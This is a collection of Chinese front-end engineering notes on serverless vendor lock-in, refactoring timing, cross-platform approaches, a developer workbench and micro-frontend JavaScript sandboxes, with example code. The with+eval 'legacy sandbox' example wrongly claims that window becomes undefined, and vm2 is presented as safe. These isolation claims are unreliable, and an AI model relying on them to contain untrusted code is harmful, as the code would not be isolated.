对响应时间敏感的接口需要特别关注\n\t- 考虑是否需要预留并发\n\t- 权衡成本和性能\n- **测试策略**\n\t- 模拟冷启动场景\n\t- 压力测试\n\t- 性能基准测试\n- **应对方案**\n\t- 关键接口使用预留并发\n\t- 非关键接口接受适度冷启动\n\t- 实施监控和告警机制\n\n冷启动是 Serverless 架构中的一个重要考虑因素，通过合理的设计和优化，可以将其影响降到最低。对于大多数应用来说，冷启动的影响是可以接受的，特别是考虑到 Serverless 带来的其他优势（如成本效益、自动扩展等）。\n\n## 3. Vendor Lock-in（供应商锁定）\n\nVendor Lock-in（供应商锁定）是云计算领域一个重要的概念，让我详细解释一下：\n\n### 3.1. 什么是 Vendor Lock-in？\n\nVendor Lock-in 指的是用户（通常是企业）过度依赖特定供应商的产品或服务，导致无法轻易切换到其他供应商的情况。在 Serverless 环境中，这种情况尤为明显。\n\n### 3.2. Serverless 中的 Vendor Lock-in 表现\n\n#### 3.2.1. **专有服务依赖**\n\n```javascript\n// AWS 专有服务示例\nconst AWS = require('aws-sdk');\nconst dynamodb = new AWS.DynamoDB();\nconst s3 = new AWS.S3();\n\n// 深度绑定 AWS 服务\nasync function handleUser(userId) {\n    await dynamodb.putItem({\n        TableName: 'Users',\n        Item: { /* ... */ }\n    }).promise();\n    \n    await s3.putObject({\n        Bucket: 'user-files',\n        Key: `${userId}/profile`,\n        Body: data\n    }).promise();\n}\n```\n\n#### 3.2.2. **专有 API 格式**\n\n```javascript\n// AWS Lambda 特定的处理器格式\nexports.handler = async (event, context) => {\n    // AWS 特定的事件格式\n    const records = event.Records;\n    // ...\n}\n\n// Azure Functions 的格式则完全不同\nmodule.exports = async function (context, myTimer) {\n    // Azure 特定的上下文和触发器\n    // ...\n};\n```\n\n### 3.3. Vendor Lock-in 的影响\n\n- **迁移困难**\n\t- 代码重写\n\t- 架构调整\n\t- 数据迁移\n\t- 运维流程变更\n- **成本影响**\n\t- 难以议价\n\t- 被动接受价格调整\n\t- 迁移成本高\n- **技术限制**\n\t- 受限于供应商的技术栈\n\t- 创新受限\n\t- 性能优化受限\n\n### 3.4. 如何降低 Vendor Lock-in 风险\n\n#### 3.4.1. **抽象层设计**\n\n````JavaScript\n\n  // 定义通用接口\n  interface StorageService {\n    save(key: string, data: any): Promise<void>;\n    get(key: string): Promise<any>;\n    delete(key: string): Promise<void>;\n  }\n\n  // AWS S3 实现\n  class S3StorageService implements StorageService {\n    private s3: AWS.S3;\n\n    constructor() {\n      this.s3 = new AWS.S3();\n    }\n\n    async save(key: string, data: any): Promise<void> {\n      await this.s3.putObject({\n        Bucket: 'my-bucket',\n        Key: key,\n        Body: data\n      }).promise();\n    }\n    // ... 其他方法实现\n  }\n\n  // Azure Blob 实现\n  class AzureStorageService implements StorageService {\n    private blobService: azure.BlobService;\n\n    constructor() {\n      this.blobService = azure.createBlobService();\n    }\n\n    async save(key: string, data: any): Promise<void> {\n      await this.blobService.createBlockBlobFromText(\n        'my-container',\n        key,\n        data\n      );\n    }\n    // ... 其他方法实现\n  }\n\n  // 业务代码使用接口，不直接依赖具体实现\n  class UserService {\n    constructor(private storage: StorageService) {}\n\n    async saveUserProfile(userId: string, data: any) {\n      await this.storage.save(`users/${userId}`, data);\n    }\n  }\n````\n\n#### 3.4.2. **使用标准化技术**\n\n- 使用开源技术栈\n- 采用容器化部署\n- 遵循云原生标准\n\n#### 3.4.3. **多云策略**\n\n   ```yaml\n   # 使用 Serverless Framework 支持多云部署\n   service: my-service\n\n   provider:\n     name: ${opt:provider, 'aws'} # 可切换云供应商\n     runtime: nodejs14.x\n\n   functions:\n     hello:\n       handler: handler.hello\n       events:\n         - http:\n             path: hello\n             method: get\n   ```\n\n#### 3.4.4. **数据管理策略**\n\n- 使用标准数据格式\n- 定期数据备份\n- 保持数据可移植性\n\n### 3.5. 实际案例分析\n\n#### 3.5.1. **高耦合场景**\n\n```javascript\n// 强依赖 AWS 服务的代码\nconst AWS = require('aws-sdk');\nconst lambda = new AWS.Lambda();\nconst dynamodb = new AWS.DynamoDB();\nconst sns = new AWS.SNS();\n\nasync function processOrder(order) {\n    // 直接使用 AWS 服务\n    await dynamodb.putItem({ /* ... */ });\n    await lambda.invoke({ /* ... */ });\n    await sns.publish({ /* ... */ });\n}\n```\n\n#### 3.5.2. **低耦合方案**\n\n```javascript\n// 使用适配器模式\nclass MessageQueue {\n    constructor(provider) {\n        this.provider = provider;\n    }\n\n    async publish(message) {\n        return this.provider.sendMessage(message);\n    }\n}\n\nclass AWSProvider {\n    async sendMessage(message) {\n        const sns = new AWS.SNS();\n        return sns.publish({\n            TopicArn: process.env.TOPIC_ARN,\n            Message: message\n        }).promise();\n    }\n}\n\nclass GCPProvider {\n    async sendMessage(message) {\n        const pubsub = new PubSub();\n        const topic = pubsub.topic(process.env.TOPIC_NAME);\n        return topic.publish(Buffer.from(message));\n    }\n}\n```\n\n### 3.6. 预防措施清单\n\n- **架构设计**\n\t- 模块化设计\n\t- 使用依赖注入\n\t- 接口抽象\n\t- 配置外部化\n- **技术选择**\n\t- 优先使用**标准协议**\n\t- 选择开源解决方案\n\t- 避免使用专有API\n- **开发实践**\n\t- 编写可移植代码\n\t- 使用配置管理\n\t- 保持文档完善\n- **运维策略**\n\t- 自动化部署脚本\n\t- 统一的监控方案\n\t- 备份和恢复计划\n\n### 3.7. 评估和决策\n\n在选择云服务时，需要考虑：\n\n- **业务需求**\n\t- 功能需求\n\t- 性能要求\n\t- 成本预算\n- **风险评估**\n\t- 供应商稳定性\n\t- 迁移难度\n\t- 长期成本\n- **平衡取舍**\n\t- 开发效率\n\t- 维护成本\n\t- 技术灵活性\n","9FcmV9Rf":"\n# 前端重构的时机\n\n`#前端架构` `#前端重构`\n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- 何时重构\n\t- `技术债务`积累到**临界点**\n\t\t- 比如代码重复度高\n\t\t- bug 修复成本高，而且引起过问题\n\t- 性能问题突出\n\t- 技术栈落后及维护成本太大\n\t\t- 比如存在安全隐患\n\t\t- 主流技术栈变了\n\t- 业务转型：\n\t\t- 比如产品方向\n\t\t- 支持新的终端设备\n\t- 团队协作\n\t\t- 新人难以上手\n- 重构建议\n\t- 渐进式重构\n\t\t- 优先级划分\n\t\t- 保证业务功能不受影响\n\t\t- 合理的里程碑\n\t- 制定重构评价==指标==\n\t\t- 代码质量指标\n\t\t- 性能指标\n\t\t- 工程效率指标\n\t\t- 可维护性\n\t\t\t- 代码注释率\n\t\t\t- TypeScript 类型覆盖率 ≥ 90%\n\t- ==详细评审==：明确的重构计划&充分的技术评估\n\t\t- 技术选型原则：Github 最近的提交记录，提交热点图等\n\t- 注意==兼容性==，做好上下游沟通\n\t- 做好==监控与度量==\n\n\n## 2. 几个关键的重构时机\n\n1. `技术债务`积累到**临界点**\n\t- 代码重复度过高（相似代码超过3处）\n\t- 代码`可维护性`严重下降\n\t- Bug 修复成本显著上升\n\t- 开发效率明显降低\n\t- 新功能开发经常需要大量修改现有代码\n2. **性能问题凸显**\n\t- 页面加载时间超过业界标准（首屏>3秒）\n\t- 运行时内存占用过高\n\t- 页面交互卡顿\n\t- 资源加载效率低下\n3. 技术栈落后及维护成本太大\n\t- 核心框架/库版本过低，**存在安全隐患**\n\t- 新版本特性能显著提升开发效率\n\t- **现有技术栈难以满足新的业务需求**\n\t- **主流技术生态**转向（如 从jQuery 到 MVVM框架）\n4. **业务转型节点**（业务发展原因）\n\t- 产品方向发生重大调整\n\t- 业务规模扩张导致架构不适配\n\t- 需要`支持新的终端设备或平台`\n\t- 用户体验需要全面升级\n5. 团队发展需要\n\t- 新成员难以快速上手现有代码\n\t- 开发规范需要统一\n\t- 工程化体系需要升级\n\t- 协作效率需要提升\n\n## 3. 重构建议\n\n### 3.1. 循序渐进\n\n- 采用**渐进式**重构策略\n- 划分优先级，分步实施\n- 保证==业务功能==不受影响\n- 设置合理的**里程碑**\n\n### 3.2. 制定明确标准：**前端重构标准 & 重构评价指标**\n\n````markdown\n## 重构评估指标\n\n### 代码质量\n\n- 圈复杂度 ≤ 10\n- 函数行数 ≤ 30行\n- 文件行数 ≤ 300行\n- 重复代码率 ≤ 5%\n\n### 性能指标\n\n- 首屏加载 ≤ 2s\n- TTI(Time to Interactive) ≤ 3s\n- 代码覆盖率 ≥ 80%\n\n### 工程效率指标\n\n- 构建时间 ≤ 1min\n- 热更新时间 ≤ 3s\n\n### 可维护性\n\n- 代码注释率 ≥ 20%\n- ESLint 规则遵守率 100%\n- TypeScript 类型覆盖率 ≥ 90%\n````\n\n==工程效率指标==：\n- 构建时间 ≤ `1min`\n- 热更新时间 ≤ `3s`\n- `TypeScript 类型覆盖率` ≥ `90%`\n\n### 3.3. 保障措施\n\n- 明确的**重构计划**\n- 充分的**技术评估**\n- 完善的==测试覆盖==\n- **灰度**发布策略\n- **回滚**机制\n- 监控**告警**体系\n\n### 3.4. 技术选型原则\n\n- 生态完善\n- 社区活跃\n- **学习成本适中**\n- 性能表现优异\n- 向后兼容性好\n\n>  建议：仔细看看 Github 最近的提交记录，提交热点图等\n\n### 3.5. 注意事项\n\n- 重构不是重写\n- 保持功能稳定性\n\t- 保持向后兼容\n- 注重开发体验\n- 考虑长期维护成本\n- **做好团队沟通**\n- 做好**监控**和`度量`\n\n## 4. 最后\n\n- 重构时机的把握需要综合**考虑技术、业务、团队等多个维度**\n- 关键是要**在适当的时候采取行动**\n\t- 既不能过早导致资源浪费\n\t- 也不能过晚导致成本过高\n- 重构是一个**持续的过程**，需要在日常开发中保持良好的工程实践，降低重构的难度和风险。","ldudBgr6":"\n# 跨端的核心技术点\n\n`#跨端` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- 前端需要干的三件事件\n\t- 获取数据\n\t\t- 卷不了，你不可能把网络实现一遍\n\t- 状态或数据管理 → `f(state,data)`\n\t\t- state 影响 Flutter 和 swiftUI\n\t\t- vdom \n\t- 页面渲染\n\t\t- 止于==宿主环境提供的渲染 API==\n\t\t\t- 比如浏览器\n\t\t\t- 客户端渲染 API\n\t\t\t- 自己实现的渲染能力：Flutter\n- 跨端方案分析：\n\t- 网页：\n\t\t- 天生的跨端，奈何性能不好\n\t- 网页 Plus：bybird 方案\n\t\t-  **预热**：\n\t\t\t- 预加载\n\t\t- **缓存**：\n\t\t\t- H5 离线包\n\t\t- **劫持**：\n\t\t\t- Web 对**网络加载的控制力**比较弱，交给 Native 做\n\t\t- **替换控件**\n\t\t\t- 使用原生控件\n\t- 小程序：\n\t\t- 封闭 + 技术半衰期短\n\t- RN：\n\t\t- vdom + js 引擎 Hermes\n\t- Flutter：自己的渲染引擎\n\t- 但 RN 和 Flutter\n\t\t- 一旦做深了，前端 hold 不住的，需要专业的客户端原生能力\n\n## 2. 前端本质只干三件事\n\n- fetch data（数据获取）\n\t- HTTP1.x、HTTP2.0、HTTP3.0 、SSE、WS 等等\n- manage state（状态管理）\n\t- pinia 、Redux 、Flux 等，进而影响 Flutter、SwiftUI 等\n- render page（页面渲染）\n\t- HTML、CSS\n\t- Canvas\n\t- 音视频\n\n## 3. 往三个方向的卷\n\n- fetch data\n\t- 没法搞，你不能把网络协议实现一遍吧\n- render page\n\t- 本质是计算机图形学，前端很难卷到底层（OpenGL、metal ...）\n\t\t- 所以这活**止于渲染引擎**\n- manage state\n\t- 现在主流的做法再抽象一层`虚拟`的东西（虚拟机或虚拟 DOM）\n\n所以，能卷的方向是：\n- 渲染引擎\n- 虚拟层\n\n## 4. 网页：JS Engine + WebKit\n\n天生的跨端\n\n## 5. 网页 PLUS：JS Engine + WebKit + Native 能力\n\nH5 容器化，hybidrd 方案\n\n- JavaScript Bridge\n\t- **预热**：\n\t\t- 预加载\n\t- **缓存**：\n\t\t- H5 离线包\n\t- **劫持**：\n\t\t- Web 对**网络加载的控制力**比较弱，交给 Native 做\n\t- **替换控件**\n\t\t- 使用原生控件\n\n## 6. 小程序：JS Engine + WebKit\n\n- 本质上就是**阉割版的网页**\n- 生态封闭\n\t- **技术半衰期短**\n\n## 7. React Native：JS Engine + Native RenderPipeLine\n\n- JavaScrip 引擎：\n\t- Hermes\n- Vdom： \n\t- 天然的跨端\n- 一旦做深了\n\t- 要求原生能力，你得会安卓 和 IOS\n\n## 8. Flutter: Dart VM + Flutter RnderPipeLine\n\n- 更进一步，自己的渲染引擎\n\n> 同样，一旦做深了，前端 hold 不住的，需要专业的客户端原生能力\n","gWw7ttNX":"\n# 前端研发工作台\n\n`#跨端` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- 一站式平台：集成整合前端开发过程中的一切\n\t- 图片重复度分析\n\t- 图片压缩\n\t- 静态资源上传CDN功能\n\t- 取色器\n\t- base64转码\n\t- URL 编解码\n\t- 运行环境：ts/es等\n\t- 前端业务的交付质量和效率\n\t- 团队及个人大盘\n\t- 公司系统集成等等\n\t\t- 物料平台\n\t\t- 业务组件库等\n- ==项目质量分==\n\t- 与工程最佳实践的对比度？\n\t- 安全分：扫描\n\t- 代码规范度：eslist 准守程度\n\t- 可维护度：\n\t\t- 文件扫描\n\t\t- 长文件、大文件、图片压缩等等等\n\t- 重复度：jscpd\n\n## 2. 核心定位和目标\n\n- 提供`一站式`的前端开发环境和工具集成\n- 提升开发效率，规范开发流程\n- 降低开发门槛，支持低代码到全代码的开发模式\n- 确保代码质量和最佳实践的落地\n\n## 3. 度量：5 个维度\n\n- 最佳实践： \n\t- 分析当前工程特征与对应工程最佳实践\n- 安全实践：\n\t- 扫码代码检测工程中可能存在的安全风险\n\t\t- 包含 url 、敏感成词、明文账密信息及 npm 包证书检测，降低项目安全风险，守卫项目安全。\n- 代码规范： \n\t- 这一维度主要反馈开发人员对于 `eslint` 开发规约的遵守程度\n- 可维护度： \n\t- 通过 `typhonjs-escomplex` 对文件进行扫码，得出每个文件的可维护度，可读性及复杂度评分。\n\t- 针对得分较差的文件可以进行深度分析帮助开发者更好的重构复杂代码。\n- 重复度： \n\t- 通过 `jscpd` 计算重复出现的代码区块占比\n\n根据上述 5 个维度通过加权平均的方式计算项目质量分，并根据木桶效应，在计算得分的过程中加大了最低分的权重，得出最终项目质量评分。 \n\n## 4. 前端研发框架：脑暴点\n\n- 开箱即用的研发框架\n\t- 内置`工程配置`、`状态管理`、`数据请求`、`权限管理`以及`后端应用集成` 等最佳实践\n\t\t- 让开发者可以`更加专注于业务逻辑`\n- 研发流程标准化\n\t- eslint/stylelint\n\t- git flow规范\n\t- code review 规范\n\t- npm包约定，写死版本\n\t- ci/cd规范等\n- 优先考虑团队\n\t- 团队已有的沉淀或者熟悉的技术栈\n- 研发体验及工具\n\t- dev\n\t- UI / UI 校对工具\n- ==联调平台==\n- 图片重复度\n- 为了让这些规则不像 eslint 可以在本地轻易跳过，采取了`服务器下发`的方式\n\t- 比如不能使用除 dva、use model 之外的数据流方案\n\t- 不能无理由使用 eval、new Function\n\t- 不能混用 cjs 和 esm 模块规范，\n\t- 组件代码==不能超过 600 行==\n\t\t- 最好是 300 行\n\t- 不能使用 resolution 锁定一方库和二方库版本\n- 前端研发工作台\n\t- 集成开发环境，包括Node版本管理、Git 配置、维护的工程目录，及常用的可配置的导航功能\n\t- **前端开发工具箱**\n\t\t- 静态资源上传CDN功能 , `unpkg`功能 ， 前端物料托管平台\n\t\t- 常用 CDN 地址，避免打包\n\t\t- 图片压缩功能\n\t\t- 取色器\n\t\t- 代码生成器\n\t\t- base64 转码\n\t\t- URL 编解码\n\t\t- `typescript`、`es`运行环境等\n\t- **VS Code插件集合**\n\t\t- 样板代码一键生成\n\t\t- 工程代码配置\n\t\t- 集成代码提交\n\t\t- 代码片段\n\t- 代码质量分：\n\t- 长文件、大文件、图片压缩等等等\n\t- 整合物料库、UI库及业务组件库\n\t- 团队及个人大盘\n\t\t- 提交代码多少，代码质量如何\n\t- 公司系统集成等等\n- 前端业务的交付质量和效率\n- 产品工程质量\n- 持续优化项目\n- 做工程治理\n- 解决开发流程中的各种痛点\n\n\n","d7l3HrWG":"\n# 微前端原理（篇一）\n\n`#微前端` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- 微前端核心原理：\n\t- ==①== 应用之间隔离：确保应用间 JS CSS DOM 互不干扰\n\t\t- js 隔离\n\t\t- css 隔离\n\t- ==②== 生命周期管理\n\t\t- 主应用统一管理：加载 → 挂载 → 更新 → 卸载\n\t- ==③== 通信机制：主应用和子应用通讯\n\t\t- event bus：事件总线\n\t\t- props \n\t\t- 全局状态库\n\t\t- 自定义事件\n\t- ==④== 路由分发\n\t\t- 主应用统一管理，分发到不同子应用\n- 常用的 JavaScript 沙箱\n\t- ==①== 快照沙箱：\n\t\t- 启动时机\n\t\t\t- `启动时`记录全局状态，在沙箱`关闭时`恢复全局状态\n\t\t\t\t- 启动：记录当前window对象快照\n\t\t\t\t- 关闭：还原window对象\n\t\t\t- ==进入一个新的容器，那么就使用启动，否则关闭==\n\t\t- 缺点：无法支持多个子应用同时运行\n\t\t- 性能：快照和恢复操作可能比较耗时\n\t- ==②== 代理沙箱\n\t\t- ==原理==：\n\t\t\t- 使用 `Proxy` 代理对象来实现沙箱，可以精确控制对全局对象的访问和修改\n\t\t- 优点：\n\t\t\t- 支持多个实例、多个应用\n\t\t\t\t-  ==优先==从自己的环境中取值\n\t\t\t\t- 否则从全局取值\n\t\t\t- 性能好，隔离性强\n\t\t- 缺点\n\t\t\t- proxy 的兼容问题\n\t- ==③== Legacy 沙箱：\n\t\t- 基于 with + eval + new Function\n\t- ==④== iframe 沙箱：\n\t\t- 天然的沙箱\n\t- ==⑤== Node.js 的 `vm2 模块` 或者 go 的 js 沙箱模块\n\t- ==⑥== 组合沙箱 (Composite Sandbox) \n- 样式隔离方案\n\t- Shadow DOM 隔离\n\t- 应用切换时：动态样式表切换\n\t\t- 性能开销大，会出现闪烁\n\t- css modules\n\t- BFM 命名规范\n\t- 子应用添加唯一前缀等\n- 应用间通讯方式\n\t- 事件总线，比如 event-bus\n\t- 状态管理\n\t\t- 结合状态管理库比如 redux 或者 pinia 的==订阅==\n\t\t- 共享实例\n\t- 直接调用\n\t- props 传递等\n- qiankun 实现原理\n\t- 主应用：\n\t\t- 注册子应用，比如\n\t\t\t- entry \n\t\t\t- container\n\t\t\t-  acitveRule\n\t\t- 监听全局路由，匹配需要加载、切换、卸载子应用等\n\t\t\t- fetch index.html → 抽取 js ，然后 eval\n\t\t\t\t- fetch 需要同域\n\t\t\t- 需要 umd 格式，故需要修改 webpack\n\t\t\t- 应用间相关跳转时，需要及时卸载\n\t\t\t- 样式隔离，两种方案\n\t\t\t\t1. 命名空间，类似于 vue scope style\n\t\t\t\t2. webcomponent \n- js 沙箱启动时机\n\t1. 子应用==加载时==启动沙箱\n\t2. 子应用==挂载时==启动沙箱\n\t3. 基于路由的沙箱管理\n\t\t- 找到要进入的路由对应的应用名\n\t\t- 如果果离开的是子应用，==关闭其沙箱==\n\t\t- 如果进入的是子应用，==启动其沙箱==\n\t\t- 可配置是否启动沙箱\n\t4. 当容器进入视口时启动沙箱\n\t\t- 使用`IntersectionObserver` 可优化性能\n- 问：如何实现`window.addEventListener('micro-app-message', handler)`\n\t- `new CustomEvent('micro-app-message'`\n\t\t- 然后 再 `window.dispatchEvent`\n- js 沙箱==性能优化==的要点\n\t- 按需启动沙箱\n\t- 使用 `WeakMap` 存储状态，避免内存泄漏\n\t- 使用 `requestIdleCallback` 进行==初始化==\n\t- 资源共享：比如 React、vue 、各类组件等\n\t\t- sandbox.setGlobalVariables(globalVars);\n- 基于DOM节点的隔离：子应用使用容器沙箱\n\t- `container.attachShadow({ mode: 'closed' });`\n\n> 另外可参考\n> - [8. 微前端原理（篇二：无界）](/post/3SBP1pr3.html)\n> - [8. 微前端原理（篇三：乾坤）](/post/JvP4OTyz.html)\n\n## 2. 微前端的核心原理\n\n- 应用隔离：确保各个子应用之间的 JavaScript、CSS、DOM 互不干扰\n\t- JavaScript 沙箱：\n\t\t- 确保各个子应用的 JS 运行环境相互隔离\n\t- CSS 隔离：\n\t\t- 防止样式冲突\n\t- 全局变量隔离：\n\t\t- 避免全局变量污染\n- 生命周期管理：**主应用**统一管理各个子应用的加载、挂载、卸载等生命周期\n\t- 加载（bootstrap）\n\t- 挂载（mount）\n\t- 卸载（unmount）\n\t- 更新（update）\n- 通信机制：在主应用和子应用之间建立通信渠道\n\t- 基于事件总线\n\t- 基于 Props 传递\n\t- 基于**全局状态管理**\n\t- 基于自定义事件\n- 路由分发：\n\t- 统一的路由管理，**将不同路由分发到对应的子应用**\n\n## 3. 常见的 JavaScript 沙箱方案\n\n>  **主要解决子应用，污染了主应用的 window 对象**\n\n### 3.1. 快照沙箱 (Snapshot Sandbox)\n\n快照沙箱的核心思想是在沙箱`启动时`记录全局状态，在沙箱`关闭时`恢复全局状态。\n- 比如，==进入一个新的容器，那么就使用启动，否则关闭==\n- 优点：\n\t- 实现简单\n- 缺点 \n\t- **无法支持多个子应用同时运行**\n\t- 性能：\n\t\t- 快照和恢复操作可能比较耗时\n\n```javascript\nclass SnapshotSandbox {\n  constructor() {\n    this.snapshot = {}; // 存储快照\n    this.modifyPropsMap = {}; // 存储被修改的属性\n  }\n\n  // 激活沙箱\n  active() {\n    // 1. 记录当前window对象的快照\n    for (const prop in window) {\n      this.snapshot[prop] = window[prop];\n    }\n\n    // 2. 恢复之前被修改的属性\n    Object.keys(this.modifyPropsMap).forEach(prop => {\n      window[prop] = this.modifyPropsMap[prop];\n    });\n  }\n\n  // 关闭沙箱\n  inactive() {\n    // 1. 记录被修改的属性\n    for (const prop in window) {\n      if (window[prop] !== this.snapshot[prop]) {\n        this.modifyPropsMap[prop] = window[prop];\n        // 2. 恢复原来的属性值\n        window[prop] = this.snapshot[prop];\n      }\n    }\n  }\n}\n\n// 使用示例\nconst sandbox = new SnapshotSandbox();\nsandbox.active();   // 激活沙箱\n// 在沙箱中运行代码\nwindow.newVar = \"test\";\nsandbox.inactive(); // 关闭沙箱\nconsole.log(window.newVar); // undefined\n```\n\n### 3.2. 代理沙箱 (Proxy Sandbox)\n\n使用 Proxy 代理对象来实现沙箱，可以精确控制对全局对象的访问和修改。\n\n- 优点：\n\t- 支持多个实例，多个应用\n\t- 性能较好\n\t- 隔离性强\n- 缺点：\n\t- 不支持低版本浏览器（需要 Proxy 支持）\n\t- 某些特殊场景可能存在兼容性问题\n\n```javascript hl:6\nclass ProxySandbox {\n  constructor() {\n    this.running = false;\n    this.proxyWindow = {};\n    \n    const fakeWindow = Object.create(null);\n    const proxy = new Proxy(fakeWindow, {\n      set: (target, prop, value) => {\n        if (this.running) {\n          target[prop] = value;\n          return true;\n        }\n        return false;\n      },\n      \n      get: (target, prop) => {\n        // 优先从代理对象中取值\n        if (prop in target) {\n          return target[prop];\n        }\n        // 否则从真实window对象中取值\n        const value = window[prop];\n        return typeof value === 'function' \n          ? value.bind(window) \n          : value;\n      },\n\n      has: (target, prop) => {\n        return prop in target || prop in window;\n      }\n    });\n\n    this.proxy = proxy;\n  }\n\n  active() {\n    this.running = true;\n  }\n\n  inactive() {\n    this.running = false;\n  }\n}\n\n// 使用示例\nconst sandbox = new ProxySandbox();\nsandbox.active();\nsandbox.proxy.newVar = \"test\";\nconsole.log(window.newVar); // undefined\nconsole.log(sandbox.proxy.newVar); // \"test\"\n```\n\n### 3.3. Legacy 沙箱 (基于 with + eval)\n\n使用 `with 语句`和 `eval` 来实现简单的沙箱隔离。\n\n```javascript\nclass LegacySandbox {\n  constructor(context = {}) {\n    this.context = context;\n  }\n\n  run(code) {\n    const contextStr = Object.keys(this.context)\n      .map(key => `let ${key} = this.context.${key}`)\n      .join(';');\n    \n    return new Function(`\n      with (this.context) {\n        ${contextStr};\n        return eval(\\`${code}\\`);\n      }\n    `).call(this);\n  }\n}\n\n// 使用示例\nconst sandbox = new LegacySandbox({\n  name: 'test',\n  log: console.log\n});\n\nsandbox.run(`\n  log(name);  // 输出: test\n  log(window); // window 是未定义的\n`);\n```\n\n### 3.4. iframe 沙箱\n\n利用 iframe 的天然隔离特性实现沙箱。\n\n```javascript hl:10\nclass IframeSandbox {\n  constructor() {\n    this.iframe = document.createElement('iframe');\n    this.iframe.style.display = 'none';\n    document.body.appendChild(this.iframe);\n    \n    this.global = this.iframe.contentWindow;\n  }\n\n  run(code) {\n    // 注入代码到 iframe 环境中执行\n    const script = this.iframe.contentDocument.createElement('script');\n    script.text = code;\n    this.iframe.contentDocument.body.appendChild(script);\n  }\n\n  destroy() {\n    document.body.removeChild(this.iframe);\n  }\n}\n\n// 使用示例\nconst sandbox = new IframeSandbox();\nsandbox.run(`\n  window.testVar = \"hello\";\n  console.log(window.testVar);\n`);\nconsole.log(window.testVar); // undefined\n```\n\n### 3.5. VM 沙箱 (基于 vm2)\n\n使用 Node.js 的 `vm2 模块`实现更安全的沙箱（**仅在 Node.js 环境中可用**）。\n\n```javascript\nconst { VM } = require('vm2');\n\nclass VMSandbox {\n  constructor(context = {}) {\n    this.vm = new VM({\n      timeout: 1000,\n      sandbox: context\n    });\n  }\n\n  run(code) {\n    return this.vm.run(code);\n  }\n}\n\n// 使用示例\nconst sandbox = new VMSandbox({\n  name: 'test',\n  console: console\n});\n\nsandbox.run(`\n  console.log(name); // 输出: test\n  // 以下代码将抛出错误，因为process是未定义的\n  // console.log(process.env);\n`);\n```\n\n> 无论是 Go 或者其他语言其实都有 JS 沙箱的实现，因为要基于它来做很多其他事情\n\n>  一些低代码平台，为了增强编排的能力等，后端使用了 JS 沙箱，支持更强更灵活的配置编排能力\n\n### 3.6. 组合沙箱 (Composite Sandbox)\n\n在实际应用中，我们可能需要组合多种沙箱技术来实现更完善的隔离。\n\n```javascript\nclass CompositeSandbox {\n  constructor() {\n    this.proxySandbox = new ProxySandbox();\n    this.snapshotSandbox = new SnapshotSandbox();\n    this.running = false;\n  }\n\n  active() {\n    if (!this.running) {\n      this.snapshotSandbox.active();\n      this.proxySandbox.active();\n      this.running = true;\n    }\n  }\n\n  inactive() {\n    if (this.running) {\n      this.snapshotSandbox.inactive();\n      this.proxySandbox.inactive();\n      this.running = false;\n    }\n  }\n\n  // 获取代理对象\n  get proxyWindow() {\n    return this.proxySandbox.proxy;\n  }\n}\n\n// 使用示例\nconst sandbox = new CompositeSandbox();\nsandbox.active();\n\nconst proxyWindow = sandbox.proxyWindow;\nproxyWindow.newVar = \"test\";\n\nconsole.log(window.newVar); // undefined\nconsole.log(proxyWindow.newVar); // \"test\"\n\nsandbox.inactive();\n```\n\n## 4. 样式隔离方案与 JS 隔离\n\n![图片&文件](./files/20241127.png)\n\n### 4.1.  Shadow DOM 隔离\n\n- 完全隔离，最彻底的方案\n- 浏览器原生支持\n- **弹窗类组件**需要特殊处理 ❓\n\t- 其实不用，正好可以解决弹窗问题呀？\n\n### 4.2. 动态样式表切换\n\n在**应用切换时动态切换样式表**，\n- 常用于 `qiankun` 等方案中， 性能开销较大，可能出现样式闪烁\n\n### 4.3. CSS Modules 方案\n\n- 优点\n\t- 编译时处理，运行时零开销\n\t- 局部作用域，避免冲突\n- 缺点\n\t- 需要修改构建配置\n\t- 所有样式需要模块化处理\n\n### 4.4. BEM 命名约定、css-In—js、子应用添加唯一前缀 等\n\n通过规范的命名约定来避免样式冲突\n\n## 5. 常见的微前端方案及对比\n\n| 特性      | 无界(wujie)             | qiankun                        | micro-app          | single-spa | iframe      | Module Federation |\n| ------- | --------------------- | ------------------------------ | ------------------ | ---------- | ----------- | ----------------- |\n| 基础实现    | WebComponent + iframe | single-spa + import-html-entry | WebComponent       | 路由劫持       | 原生 iframe   | Webpack 5 模块联邦    |\n| 隔离方案    | CSS/JS 完全隔离           | 快照沙箱/代理沙箱                      | Shadow DOM         | 无          | 天然隔离        | 无                 |\n| 性能      | 优秀                    | 一般                             | 较好                 | 较好         | 一般          | 优秀                |\n| 预加载     | 支持                    | 支持                             | 支持                 | 不支持        | 不支持         | 支持                |\n| 通信方式    | props + 发布订阅          | props + 发布订阅                   | CustomEvent + 数据属性 | 发布订阅       | postMessage | 模块导入导出            |\n| 子应用改造   | 极少                    | 中等                             | 较少                 | 较多         | 无           | 中等                |\n| 主应用改造   | 较少                    | 中等                             | 较少                 | 较多         | 无           | 中等                |\n| 技术栈限制   | 无                     | 无                              | 无                  | 无          | 无           | 需使用 Webpack 5     |\n| 子应用共享依赖 | 支持                    | 支持                             | 不支持                | 支持         | 不支持         | 原生支持              |\n| 样式隔离    | 完全隔离                  | 动态样式表切换                        | Shadow DOM         | 无          | 完全隔离        | 无                 |\n| JS 沙箱   | iframe + Proxy        | Proxy/Snapshot                 | iframe Proxy       | 无          | 天然隔离        | 无                 |\n| CSP 策略  | 友好                    | 不友好                            | 较友好                | 友好         | 友好          | 友好                |\n| 子应用调试   | 便捷                    | 一般                             | 便捷                 | 一般         | 便捷          | 便捷                |\n|         |                       |                                |                    |            |             |                   |\n\n## 6. 实现一个主应用和子应用之间的通信系统\n\n![图片&文件](./files/20241127-1.png)\n\n这个`通信系统`提供了三种主要的通信方式：\n\n1. **事件总线**：用于发布-订阅模式的事件通信\n2. **状态管理**：用于共享数据和状态\n3. **直接调用**：用于直接调用其他应用提供的方法\n\n主要特点：\n- 支持多种通信方式\n- 类型安全\n- 统一的API\n- 支持事件解绑和状态取消订阅\n- 错误处理\n- 支持所有框架（框架无关）\n\n在实际使用中，可以根据需求选择合适的通信方式，并可以进一步扩展功能，如：\n- 添加通信日志\n- 实现通信加密\n- 添加权限控制\n- 实现通信超时处理\n- 添加消息队列\n- 实现通信重试机制\n\n## 7. qiankun 的实现原理\n\n>  更多见个人流程图整理： 